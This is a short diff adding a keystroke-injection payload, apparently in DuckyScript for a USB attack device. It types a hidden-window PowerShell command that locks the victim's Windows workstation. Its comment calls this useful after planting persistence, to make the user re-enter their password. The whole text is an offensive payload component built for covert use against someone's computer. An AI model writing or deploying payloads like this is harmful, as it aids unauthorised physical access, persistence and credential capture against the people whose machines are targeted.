@@ -1,0 +1,4 @@
+REM lock the workstation (Win+L equivalent)
+REM good after planting persistence - forces user to burn the unlock attempt / show password
+STRING powershell -NoProfile -WindowStyle Hidden -Command "rundll32.exe user32.dll,LockWorkStation"
+ENTER
